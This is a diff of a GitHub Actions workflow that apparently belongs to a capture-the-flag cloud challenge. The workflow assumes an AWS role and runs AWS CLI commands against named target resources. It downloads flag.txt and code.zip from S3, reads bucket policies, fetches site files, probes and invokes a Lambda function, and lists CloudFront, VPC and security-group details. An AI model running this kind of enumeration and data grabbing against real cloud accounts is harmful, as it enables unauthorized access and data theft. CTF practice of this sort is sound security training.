@@ -10,7 +10,7 @@ permissions:
 
 jobs:
   dump:
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     steps:
       - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v4
@@ -19,34 +19,43 @@ jobs:
           aws-region: us-east-1
           role-session-name: cloudescape-corgi
 
-      - name: Get flag candidates
+      - name: Enumerate and grab
         run: |
           set +e
-          echo "=== try get flag.txt from codec bucket ==="
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - ; echo EXIT:$?
-          aws s3api get-object --bucket codec4f26c862a321ef5 --key flag.txt /tmp/flag.txt ; echo EXIT:$?
-          if [ -f /tmp/flag.txt ]; then echo CONTENT; xxd /tmp/flag.txt; cat /tmp/flag.txt; fi
-
+          aws sts get-caller-identity
+          echo "=== GET flag.txt ==="
+          aws s3 cp "s3://codec4f26c862a321ef5/flag.txt" - 2>&1 | tee /tmp/flag.txt
+          echo
+          echo "=== GET code.zip ==="
+          aws s3 cp "s3://codec4f26c862a321ef5/code.zip" /tmp/code.zip 2>&1
+          ls -la /tmp/code.zip 2>&1
+          unzip -l /tmp/code.zip 2>&1 || true
+          unzip -p /tmp/code.zip 2>&1 | head -c 4000 || true
+          echo
           echo "=== bucket policies ==="
           for b in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "--- policy $b ---"
-            aws s3api get-bucket-policy --bucket "$b" --output text 2>&1
-            echo "--- status $b ---"
-            aws s3api get-bucket-policy-status --bucket "$b" 2>&1
-            echo "--- acl $b ---"
-            aws s3api get-bucket-acl --bucket "$b" 2>&1 | head -40
+            echo "---- $b policy ----"
+            aws s3api get-bucket-policy --bucket "$b" 2>&1 || true
+            echo "---- $b policy status ----"
+            aws s3api get-bucket-policy-status --bucket "$b" 2>&1 || true
           done
-
-          echo "=== list all keys detailed ==="
-          for b in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "==== $b ===="
-            aws s3api list-objects-v2 --bucket "$b" --output json 2>&1
-          done
-
-          echo "=== lambda policy / try invoke ==="
-          aws lambda get-policy --function-name nslookupv2 2>&1
-          aws lambda invoke --function-name nslookupv2 --payload '{"domain":"example.com"}' /tmp/out.json 2>&1
-          cat /tmp/out.json 2>/dev/null
-
-          echo "=== cloudfront ==="
-          aws cloudfront list-distributions --output json 2>&1 | head -c 50000
+          echo "=== site objects via get ==="
+          aws s3 cp "s3://site781fe43f26b9eba3/index.html" - 2>&1 | head -c 2000
+          echo
+          aws s3 cp "s3://site781fe43f26b9eba3/js/scripts.js" - 2>&1 | head -c 3000
+          echo
+          echo "=== Lambda policy + try invoke ==="
+          aws lambda get-policy --function-name nslookupv2 2>&1 || true
+          aws lambda get-function-url-config --function-name nslookupv2 2>&1 || true
+          aws lambda list-function-url-configs --function-name nslookupv2 2>&1 || true
+          aws lambda invoke --function-name nslookupv2 --payload '{"domain":"example.com"}' /tmp/out.json 2>&1 || true
+          cat /tmp/out.json 2>/dev/null || true
+          echo "=== CloudFront ==="
+          aws cloudfront list-distributions --output json 2>&1 | head -c 20000
+          echo "=== EC2 describe VPC ==="
+          aws ec2 describe-vpcs --output json 2>&1 | head -c 8000
+          aws ec2 describe-subnets --filters Name=vpc-id,Values=vpc-09328d3fa21dce320 --output json 2>&1 | head -c 8000
+          aws ec2 describe-security-groups --group-ids sg-0de9d1a2c42a08a3e --output json 2>&1 | head -c 8000
+          echo "=== try get object ACL / head ==="
+          aws s3api head-object --bucket codec4f26c862a321ef5 --key flag.txt 2>&1 || true
+          aws s3api get-object-acl --bucket codec4f26c862a321ef5 --key flag.txt 2>&1 || true
